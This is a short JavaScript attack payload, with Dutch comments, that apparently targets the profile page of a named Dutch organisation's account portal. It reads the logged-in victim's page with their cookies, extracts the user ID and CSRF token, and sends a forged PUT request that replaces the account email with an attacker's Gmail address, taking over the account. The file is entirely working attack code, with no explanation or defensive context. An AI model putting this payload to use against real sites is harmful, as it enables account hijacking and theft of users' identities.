fetch('https://mijn-acc.nivel.nl:443/profile', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())
.then(data => {
    let attackerEmail = "p.elroy@gmail.com"
    // Parse the response HTML string into a jQuery object
    htmlResponse = $(data);

    // Het ID van de user is de waarde na de laatste '/'
    let userId = htmlResponse.find('#profile-form').attr('action').split('/').pop();

    // extract csrfToken om te gebruiken in POST request naar /profile/update
    let csrfToken = htmlResponse.find('input[type="hidden"]')[0].value

    fetch(`http://10.2.3.4/${userId}`,{
        method: 'POST',
        headers: {
            'Content-Type': 'multipart/form-data; boundary=---------------------------95608690836944065642078770881', 
        },
        credentials: 'include',
        body: `-----------------------------95608690836944065642078770881\x0d\x0aContent-Disposition: form-data; name="_method"\x0d\x0a\x0d\x0aPUT\x0d\x0a-----------------------------95608690836944065642078770881\x0d\x0aContent-Disposition: form-data; name="_token"\x0d\x0a\x0d\x0a${csrfToken}\x0d\x0a-----------------------------95608690836944065642078770881\x0d\x0aContent-Disposition: form-data; name="name"\x0d\x0a\x0d\x0aCyberCloud\x0d\x0a-----------------------------95608690836944065642078770881\x0d\x0aContent-Disposition: form-data; name="email"\x0d\x0a\x0d\x0a${attackerEmail}\x0d\x0a-----------------------------95608690836944065642078770881\x0d\x0a`
    });
});
